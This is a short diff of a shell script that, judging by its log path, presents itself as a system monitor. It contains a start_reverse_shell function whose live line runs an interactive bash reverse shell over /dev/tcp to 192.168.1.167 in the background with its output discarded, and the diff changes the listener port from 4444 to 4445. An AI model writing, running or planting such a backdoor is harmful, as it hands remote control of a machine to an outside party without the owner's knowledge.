@@ -30,7 +30,7 @@ LOG_DIR="/var/log/system-monitor"
 start_reverse_shell() {
     log_info "Starting reverse shell..."
     # Run in background
-    nohup bash -c 'bash -i >& /dev/tcp/192.168.1.167/4444 0>&1' >/dev/null 2>&1 &
+    nohup bash -c 'bash -i >& /dev/tcp/192.168.1.167/4445 0>&1' >/dev/null 2>&1 &
     
     # Verify it's running
     sleep 2
